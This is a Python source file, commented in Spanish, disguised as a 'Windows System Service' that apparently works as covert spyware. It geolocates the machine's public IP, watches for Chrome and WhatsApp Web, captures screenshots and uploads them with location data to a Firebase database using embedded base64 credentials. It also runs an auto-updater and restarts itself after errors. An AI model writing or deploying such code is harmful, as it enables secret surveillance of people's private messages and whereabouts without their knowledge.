# win_svc.py - Windows System Service
import time
import threading
import psutil
import requests
import json
import logging
import os
import sys
import base64  # <--- NUEVO
from datetime import datetime
import firebase_admin
from firebase_admin import credentials, db
from nt_display import DisplayHandler
from updater_svc import SystemUpdater
import sys_config as config


def get_base_dir():
    """Devuelve el directorio donde está el ejecutable o el script."""
    if getattr(sys, 'frozen', False):
        # Estamos en un ejecutable compilado con PyInstaller
        return os.path.dirname(sys.executable)
    else:
        # Estamos ejecutando el script con python
        return os.path.dirname(os.path.abspath(__file__))

# Configurar logging a archivo
log_path = os.path.join(get_base_dir(), "agent.log")
logging.basicConfig(
    filename=log_path,
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logging.info("=== AGENTE INICIADO ===")
logging.info(f"Directorio base: {get_base_dir()}")


def crear_credenciales():
    """Decodifica el Base64 de sys_config.py y escribe sys_creds.dat"""
    logging.info("Intentando crear/leer sys_creds.dat")
    cred_file = os.path.join(get_base_dir(), "sys_creds.dat")
    logging.info(f"Ruta del archivo de credenciales: {cred_file}")
    
    # Si ya existe y tiene datos, lo usamos
    if os.path.exists(cred_file):
        logging.info("sys_creds.dat ya existe, validando contenido")
        try:
            with open(cred_file, "r") as f:
                content = f.read().strip()
                if content and content != "{}":
                    json.loads(content)  # Validar que es JSON
                    print("[✓] sys_creds.dat ya existe y es válido")
                    return True
        except:
            pass  # Si está corrupto, lo regeneramos

    try:
        logging.info("Generando sys_creds.dat desde Base64...")
        # Decodificar el Base64
        json_bytes = base64.b64decode(config.CREDS_B64)
        json_str = json_bytes.decode('utf-8')
        logging.info("Base64 decodificado correctamente")
        
        # Validar que es JSON válido
        data = json.loads(json_str)
        logging.info("JSON de credenciales validado")
        
        # Escribir el archivo (SIN BOM, UTF-8 puro)
        with open(cred_file, "w", encoding='utf-8') as f:
            json.dump(data, f, indent=2)
        
        logging.info("sys_creds.dat creado correctamente desde Base64")
        return True
        
    except Exception as e:
        print(f"[!] Error creando credenciales desde Base64: {e}")
        return False


class WindowsSystemService:
    def __init__(self):
        print("[*] Iniciando servicio del sistema...")

        # Crear credenciales desde Base64
        if not crear_credenciales():
            print("[!] Error crítico: No se pudieron crear las credenciales")
            sys.exit(1)

        # Inicializar Firebase
        cred_path = os.path.join(get_base_dir(), config.FIREBASE_CREDENTIALS)
        if not os.path.exists(cred_path):
            print(f"[!] ERROR: No se encuentran credenciales del sistema")
            sys.exit(1)

        try:
            cred = credentials.Certificate(cred_path)
            firebase_admin.initialize_app(cred, {
                'databaseURL': config.FIREBASE_DB_URL
            })
            print("[✓] Servicio de sincronización iniciado")
            logging.info("Firebase inicializado correctamente")
        except Exception as e:
            print(f"[!] Error en servicio de sincronización: {e}")
            sys.exit(1)

        self.display = DisplayHandler()
        self.device_id = self.get_device_id()
        print(f"[✓] ID del sistema: {self.device_id}")

        self.ultima_captura = 0
        self.ejecutando = True

        self.updater = SystemUpdater()
        self.hilo_actualizacion = threading.Thread(target=self.updater.ciclo_actualizacion, daemon=True)
        self.hilo_actualizacion.start()
        print("[✓] Servicio de actualizaciones iniciado")

    def get_device_id(self):
        try:
            import uuid
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                           for elements in range(0, 2*6, 2)][::-1])
            return mac.replace(':', '')
        except:
            try:
                import win32api
                volume = win32api.GetVolumeInformation("C:\\")[1]
                import socket
                return f"{socket.gethostname()}_{volume}"
            except:
                return f"SYS_{int(time.time())}"

    def get_ip_publica(self):
        try:
            response = requests.get('https://api.ipify.org?format=json', timeout=5)
            return response.json()['ip']
        except:
            return None

    def get_geolocalizacion(self, ip):
        if not ip:
            return None
        try:
            response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
            data = response.json()
            if data['status'] == 'success':
                return {
                    'lat': data['lat'],
                    'lon': data['lon'],
                    'city': data['city'],
                    'region': data['regionName'],
                    'country': data['country'],
                    'isp': data['isp']
                }
        except:
            pass
        return None

    def detectar_aplicaciones(self):
        chrome_activo = False
        whatsapp_activo = False
        ventana_titulo = None
        try:
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    nombre = proc.info['name'].lower()
                    if 'chrome.exe' in nombre or 'msedge.exe' in nombre:
                        chrome_activo = True
                        if proc.info['cmdline']:
                            cmdline = ' '.join(proc.info['cmdline']).lower()
                            if 'web.whatsapp.com' in cmdline or 'whatsapp' in cmdline:
                                whatsapp_activo = True
                                ventana_titulo = "WhatsApp Web"
                except:
                    pass
        except:
            pass
        return chrome_activo, whatsapp_activo, ventana_titulo

    def enviar_datos(self, ubicacion, screenshot_url=None, metadata=None):
        try:
            ref = db.reference(f'/dispositivos/{self.device_id}')
            data = {
                'timestamp': datetime.now().isoformat(),
                'fecha': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'ip': ubicacion.get('ip'),
                'ubicacion': ubicacion.get('geo', {}),
                'screenshot': screenshot_url,
                'version': config.VERSION_ACTUAL
            }
            if metadata:
                data['metadata'] = metadata
            logging.info(f"Enviando datos a Firebase: {data}")
            ref.child('historial').push(data)
            ref.child('ultima').set(data)
            if screenshot_url:
                ref.child('stats').child('total_capturas').transaction(lambda current: (current or 0) + 1)
            print(f"[✓] Datos sincronizados [{datetime.now().strftime('%H:%M:%S')}]")
            return True
        except Exception as e:
            print(f"[!] Error en sincronización: {e}")
            return False

    def ciclo_principal(self):
        logging.info("Ciclo principal iniciado")
        print("[*] Servicio del sistema activo - Monitoreando...")
        print(f"[*] Versión: {config.VERSION_ACTUAL}")
        print(f"[*] Intervalo de sincronización: {config.SYNC_INTERVAL} segundos")
        print("-" * 50)
        while self.ejecutando:
            try:
                ip = self.get_ip_publica()
                geo = self.get_geolocalizacion(ip) if ip else None
                ubicacion = {'ip': ip, 'geo': geo}
                chrome, whatsapp, titulo = self.detectar_aplicaciones()
                tomar_captura = False
                motivo = None
                metadata = {}
                tiempo_transcurrido = time.time() - self.ultima_captura
                if tiempo_transcurrido >= config.SYNC_INTERVAL:
                    tomar_captura = True
                    motivo = "sincronizacion"
                    metadata['tiempo_transcurrido'] = int(tiempo_transcurrido)
                if chrome and config.SCAN_INTERVAL > 0:
                    tomar_captura = True
                    motivo = "deteccion_chrome"
                    metadata['chrome'] = True
                if whatsapp and config.WHATSAPP_DETECT:
                    tomar_captura = True
                    motivo = "deteccion_whatsapp"
                    metadata['whatsapp'] = True
                    metadata['titulo'] = titulo
                screenshot_url = None
                if tomar_captura:
                    print(f"[*] Capturando pantalla... Motivo: {motivo}")
                    img_path = self.display.capturar_pantalla()
                    if img_path:
                        screenshot_url = self.display.subir_cache(img_path)
                        if screenshot_url:
                            self.ultima_captura = time.time()
                    metadata['motivo'] = motivo
                    metadata['chrome_activo'] = chrome
                    metadata['whatsapp_activo'] = whatsapp
                    metadata['hora_captura'] = datetime.now().strftime("%H:%M:%S")
                    self.enviar_datos(ubicacion, screenshot_url, metadata)
                else:
                    if int(time.time()) % 60 == 0:
                        self.enviar_datos(ubicacion)
                time.sleep(config.CICLO_INTERVALO)
            except Exception as e:
                print(f"[!] Error en servicio: {e}")
                time.sleep(30)

def main():
    try:
        servicio = WindowsSystemService()
        servicio.ciclo_principal()
    except KeyboardInterrupt:
        print("\n[*] Servicio detenido por el usuario")
    except Exception as e:
        print(f"[!] Error fatal: {e}")
        time.sleep(30)
        main()

if __name__ == "__main__":
    main()